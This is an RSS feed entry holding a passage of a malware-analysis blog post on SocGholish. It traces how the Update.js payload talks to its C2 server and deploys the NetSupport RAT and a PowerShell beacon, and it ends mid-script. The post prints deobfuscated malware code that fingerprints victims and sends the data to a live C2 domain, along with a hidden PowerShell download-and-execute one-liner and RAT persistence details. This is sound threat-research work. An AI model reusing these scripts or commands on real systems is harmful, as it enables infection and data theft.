<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Reverse Engineering and Analysis</title>
        <link>https://rerednawyerg.github.io/posts/</link>
        <description>Recent content in Posts on Reverse Engineering and Analysis</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Mon, 19 Jun 2023 07:20:21 -0500</lastBuildDate>
        <atom:link href="https://rerednawyerg.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>SocGholish Series - Part 3</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/</link>
            <pubDate>Mon, 19 Jun 2023 07:20:21 -0500</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/</guid>
            <description>This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &amp;ldquo;SocGholish Series - Part 2&amp;rdquo;, I had obtained the primary, first stage JavaScript payload, titled Updates.js.
In this writeup, I will execute the payload and observe the response(s) from the C2 server.</description>
            <content type="html"><![CDATA[<hr>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &ldquo;SocGholish Series - Part 2&rdquo;, I had obtained the primary, first stage JavaScript payload, titled <em>Updates.js</em>.</p>
<p>In this writeup, I will execute the payload and observe the response(s) from the C2 server.</p>
<h2 id="updatejs-payload">Update.js Payload</h2>
<p>To begin, let me quickly review how the payload was captured. I would recommend using the first post in the series to follow along, if desired.</p>
<p>An interesting new wrinkle which was not present a few months ago, as far as I was aware, is the use of multiple Keitaro TDS domains as injects on a single compromised site. Here is an interesting <a href="https://infosec.exchange/@rmceoin/110449126953524134">thread</a> describing their behavior.</p>
<p>However, for the sake of the logical flow of the series, I will not delve into this inject type in this post, and will focus on the previously identified injection type in the format:</p>
<pre><code class="language-String" data-lang="String">&lt;script async src=&quot;https://&lt;domain&gt;/&lt;random_string_path&gt;&quot;&gt;&lt;/script&gt;
</code></pre><h3 id="obtaining-the-payload">Obtaining the Payload</h3>
<p>In a Windows VM, I navigated to a site on which a SocGholish inject had been identified, hxxps://www.hekl-metall[.]de.</p>
<p>The inject:</p>
<pre><code class="language-String" data-lang="String">https://templates.jdlaytongrademaker[.]com/AVmNsHp77tlle7eCNmuhknIw6ZI7b7iJNm+5nCMrr4ojKfvHcTz+3nku6cB0LObYbSjnxSMk
</code></pre><p>The second stage server responds with a large, obfuscated block of JavaScript. The JavaScript checks for various identifying aspects of the victim device, and then makes a GET request to the same second stage server:</p>
<pre><code class="language-String" data-lang="String">https://templates.jdlaytongrademaker[.]com/krOlC+mRxmL2kZ85pYGJKeHHwHuwiYdq/NLJcujW+m3ikYkp4JGfKf/Eh3Y=
</code></pre><p>From here, the process is identical to what I outlined in the <a href="https://rerednawyerg.github.io/posts/malwareanalysis/socgholish/">Fake Update Page</a> section in the first post in the series, so I will not dig into it further here.</p>
<p>The fake update page is shown, and once the &ldquo;download&rdquo; button is clicked, the Update.js payload is added to my Downloads folder.</p>
<h3 id="payload-contents">Payload Contents</h3>
<p>The contents of the payload are very similar to what I described in &ldquo;SocGholish Series - Part 2&rdquo;.</p>
<p>After removing the obfuscation and performing logical function and variable renaming, I am left with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activeXObject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;ActiveXObject&#39;</span>](<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;open&#39;</span>](<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda[.]org/gotoCheckout&#39;</span>), <span style="color:#f92672">!</span>[]),
<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;setRequestHeader&#39;</span>](<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>), 
<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;send&#39;</span>](<span style="color:#e6db74">&#39;9Wc+14W1/MmSf3OfPfWgAhWibAiEEJslsZ8BcxSL3w==&#39;</span>), 
<span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#a6e22e">get_resp_text</span>(<span style="color:#a6e22e">activeXObject</span>))
</code></pre></div><p>The payload POSTs a hardcoded string to a C2 server, and executes the response, whatever it may be.</p>
<h3 id="socgholish-c2-server-first-response">SocGholish C2 Server: First Response</h3>
<p>Having configured tools to monitor the requests and responses to the C2 server, I executed the JS script as a normal user would, by double clicking it in the Downloads folder.</p>
<p>Immediately, the C2 responded with a short snippet of JavaScript, which is subsequently executed.</p>
<p>The cleaned response is below:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sz</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Shell&#39;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wscript_network_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Network&#39;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span><span style="color:#f92672">=</span>[];
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;b&#39;</span>);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;501&#39;</span>);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">WScript</span>[<span style="color:#e6db74">&#39;ScriptFullName&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;ComputerName&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;UserName&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;UserDomain&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">activex_obj</span>[<span style="color:#e6db74">&#39;ExpandEnvironmentStrings&#39;</span>](<span style="color:#e6db74">&#39;%userdnsdomain%&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>,<span style="color:#e6db74">&#39;Manufacturer&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>,<span style="color:#e6db74">&#39;Model&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_BIOS&#39;</span>,<span style="color:#e6db74">&#39;Version&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_BIOS&#39;</span>,<span style="color:#e6db74">&#39;SerialNumber&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;SecurityCenter2&#39;</span>,<span style="color:#e6db74">&#39;AntiSpywareProduct&#39;</span>,<span style="color:#e6db74">&#39;displayName&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;SecurityCenter2&#39;</span>,<span style="color:#e6db74">&#39;AntiVirusProduct&#39;</span>,<span style="color:#e6db74">&#39;displayName&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;CIM_NetworkAdapter&#39;</span>,<span style="color:#e6db74">&#39;MACAddress&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_Process&#39;</span>,<span style="color:#e6db74">&#39;Name&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_OperatingSystem&#39;</span>,<span style="color:#e6db74">&#39;BuildNumber&#39;</span>));

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">wmi_query</span>(<span style="color:#a6e22e">arg1</span>,<span style="color:#a6e22e">arg2</span>,<span style="color:#a6e22e">arg3</span>){
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ret_str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
	<span style="color:#66d9ef">try</span>{
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">winmgmt_obj</span><span style="color:#f92672">=</span><span style="color:#a6e22e">GetObject</span>(<span style="color:#e6db74">&#34;winmgmts:\\\\.\\root\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">arg1</span>);
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">results</span><span style="color:#f92672">=</span><span style="color:#a6e22e">winmgmt_obj</span>[<span style="color:#e6db74">&#39;ExecQuery&#39;</span>](<span style="color:#e6db74">&#39;SELECT * FROM &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arg2</span>,<span style="color:#e6db74">&#39;WQL&#39;</span>);
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">enumerator</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Enumerator</span>(<span style="color:#a6e22e">results</span>);
		<span style="color:#66d9ef">for</span>(; <span style="color:#f92672">!</span><span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;atEnd&#39;</span>](); <span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;moveNext&#39;</span>]()){
			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">item</span><span style="color:#f92672">=</span><span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;item&#39;</span>]();
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">arg3</span>]){
				<span style="color:#a6e22e">ret_str</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">arg3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;|&#39;</span>;
			}
		}
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
		<span style="color:#a6e22e">ret_str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;-1&#39;</span>;
	}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret_str</span>;
}

<span style="color:#66d9ef">try</span>{
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c2_string</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
		<span style="color:#a6e22e">c2_string</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">array</span>[<span style="color:#a6e22e">i</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;&#39;</span>;
	}
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">resp_text</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda.org/gotoCheckout&#39;</span>,<span style="color:#66d9ef">false</span>);
	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">c2_string</span>);
	<span style="color:#a6e22e">resp_text</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">responseText</span>;
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">evString</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eval&#39;</span>;
	<span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">evString</span>](<span style="color:#a6e22e">resp_text</span>);
}
<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</code></pre></div><p>The purpose of this script is to &ldquo;fingerprint&rdquo; the victim device and relay the information back to the C2 server in a specific format. If the C2 responds, the response text is executed.</p>
<p>The trouble I ran into here, is that since I was running Windows in a VM, this information would be captured in many of the WMI queries, including the manufacturer, model, and version, as well as some running processes.</p>
<p>The C2 <em>will</em> perform checks to estimate whether their &ldquo;victim&rdquo; is a security researcher, so I&rsquo;ll have to make some adjustments in order to get a response.</p>
<p>To quote from a fantastic <a href="https://www.proofpoint.com/us/blog/threat-insight/ta569-socgholish-and-beyond">article</a> from Proofpoint&rsquo;s Andrew Northern - &ldquo;SocGholish payloads are dynamically generated with data points about the victim being an input. This dynamic generation essentially locks each payload to each victim causing the payload to be rendered useless if it is moved to a different environment for analysis. Additionally, each payload is keyed to a specifically prefixed subdomain for command and control (C2) communication. Attempting to interact with a previously observed C2 domain with a known prefix will result in a closed connection.&rdquo;</p>
<p>If the C2 detects that the victim is a VM, it will not respond to any requests from that IP again. Each failure means I&rsquo;ll need to use a new victim IP address and run through the whole infection chain starting with the compromised site to get a freshly generated payload.</p>
<p>Inspired by this <a href="https://infosec.exchange/@rmceoin/110289792904238153">post</a> from <a href="https://infosec.exchange/@rmceoin">@rmceoin</a>, I created rules in BurpSuite to find and replace specific strings in the request body of traffic passing through the proxy.</p>
<p>For example, the string <code>VirtualBox</code> would be replaced with <code>HP%20Z620%20Workstation</code>, <code>VBoxTray.exe</code> would be replaced with <code>svchost.exe</code>, and so on.</p>
<p>In addition to these measures to obscure my VM from the threat actor, I also supplied a fake domain to replace the blank result returned by <code>activex_obj['ExpandEnvironmentStrings']('%userdnsdomain%')</code>. In a future post, I would like to explore the differences (if any) of the response returned by the C2 when given a domain versus no domain.</p>
<p>After a few sessions of trial and error, I was finally able to obtain another response from the C2.</p>
<h3 id="socgholish-c2-server-second-response">SocGholish C2 Server: Second Response</h3>
<p>The C2 responded with another block of JavaScript, but interestingly, this one was not obfuscated.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">initExeption</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">runFileExeption</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">runFileResult</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">execFileName</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;7714b363.ps1&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_tempFilePathExec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">GetSpecialFolder</span>(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">execFileName</span>;
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">initExeption</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;0&#39;</span>){
	<span style="color:#66d9ef">try</span>{
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wsh</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>);
		<span style="color:#a6e22e">runFileResult</span><span style="color:#f92672">=</span><span style="color:#a6e22e">wsh</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#e6db74">&#39;powershell -w h -c &#34;iwr -usebasicparsing http://wudugf.top/f23.svg |iex&#34;&#39;</span>,<span style="color:#ae81ff">0</span>);;
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
		<span style="color:#a6e22e">runFileExeption</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;error number:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; message:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>;
	}
}
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span><span style="color:#f92672">=</span>[];
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;c&#39;</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;501&#39;</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">_tempFilePathExec</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">runFileResult</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">initExeption</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">runFileExeption</span>);
<span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">req</span>);
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">requestdata</span>,<span style="color:#a6e22e">retbinary</span>){
	<span style="color:#66d9ef">try</span>{
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">requestdata</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">param</span>,<span style="color:#a6e22e">val</span>;
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>]){
				<span style="color:#a6e22e">param</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>];
				<span style="color:#a6e22e">val</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">1</span>];
			}
			<span style="color:#66d9ef">else</span>{
				<span style="color:#a6e22e">param</span><span style="color:#f92672">=</span><span style="color:#a6e22e">i</span>;
				<span style="color:#a6e22e">val</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>];
			}
			<span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">val</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;&#39;</span>;
		}
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda.org/gotoCheckout&#39;</span>,<span style="color:#66d9ef">false</span>);
		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">payload</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">retbinary</span>){
			<span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">responseBody</span>;
		}
		<span style="color:#66d9ef">else</span>{
			<span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">responseText</span>;
		}
		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>;
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
}
</code></pre></div><p>Similar to the previous script, this will gather some info about the victim machine, format the results, and send a response back to the C2.</p>
<p>The big difference between the two is the use of PowerShell to download and execute a file called <code>f23.svg</code>.</p>
<p>At this point, the <code>*.nodes.gammalambdalambda.org</code> did not respond, and even if it did, there is no functionality in place to execute the response.</p>
<p>I will now pivot my focus to the file which has been downloaded and executed via PowerShell.</p>
<h2 id="powershell---wudugftopf23svg">PowerShell - wudugf.top/f23.svg</h2>
<p>At first glance, the PowerShell is rather simple, there are two very large base64 encoded strings which are passed to a &ldquo;decode&rdquo; function.</p>
<p>The decode function converts the strings from base64, and then loops through each element of the string and XORs them with an index of a hardcoded key.</p>
<p>Once the string has been XOR&rsquo;d, it is decompressed using Gzip and returned.</p>
<p>The first base64 string is passed to the decode function and returned to a variable I&rsquo;ve named <code>$zip_file</code> - you&rsquo;ll see why in the next section.</p>
<p>The second base64 string is decoded and then piped to IEX - more PowerShell to explore.</p>
<h3 id="nested-powershell">Nested PowerShell</h3>
<p>The nested PowerShell has two primary purposes, which are seemingly unrelated to each other.</p>
<p>One of these purposes is to extract and deploy the NetSupport RAT, which is commonly observed being deployed by SocGholish infrastructure. The specific PowerShell behavior has also been <a href="https://blog.cyble.com/2022/09/21/netsupport-rat-distributed-via-socgholish/">documented</a> by other researchers in the past.</p>
<p>The second purpose is to deploy a separate PowerShell C2 beacon. It is interesting to see two payloads being deployed by the same C2 server, although SocGholish is known to be an initial access broker.</p>
<h3 id="nested-powershell-netsupport-rat">Nested PowerShell: NetSupport RAT</h3>
<p>The first primary purpose of the nested PowerShell is to extract the contents of the <code>$zip_file</code> variable using <code>[IO.Compression.Zipfile]::ExtractToDirectory</code>.</p>
<p>This zip file will be saved to the user&rsquo;s <code>$env:appdata</code> folder under a randomly named directory.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/netsupport_rat.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/netsupport_rat.png"
            alt="netsupport_rat"
            />
    </a>
    
</figure>
This zip file contains the NetSupport RAT binary as well as its dependencies.</p>
<p>After the NetSupport RAT folder has been extracted, the <code>client32.exe</code> file is renamed to <code>whost.exe</code>.</p>
<p>Persistence is established by adding the registry key &ldquo;ExpirienceHost&rdquo; under <code>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code>, with the value set to the full path of the NetSupport RAT binary.</p>
<p>Once persistence is established, <code>Invoke-WmiMethod</code> is used to execute NetSupport RAT.</p>
<p>NetSupport RAT has been around for quite a while, and for those curious to learn more about it, good writeups can be easily found via a web search.</p>
<h3 id="nested-powershell-powershell-beacon">Nested PowerShell: PowerShell Beacon</h3>
<p>This is where things, in my opinion, get more interesting.</p>
<p>The second purpose of the nested PowerShell is to deploy a PowerShell C2 beacon.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">start-process powershell -args <span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">	new-alias rzs $(&#39;</span>invoke-expression<span style="color:#e6db74">&#39;) ;
</span><span style="color:#e6db74">	$rand_int = New-Object ($(&#39;</span>System.Random<span style="color:#e6db74">&#39;) )([int]((((Get-Date).DayOfYear+3) / 7) +2024)*1562);
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">	for ($i = 0; $i -lt 15; $i++) {
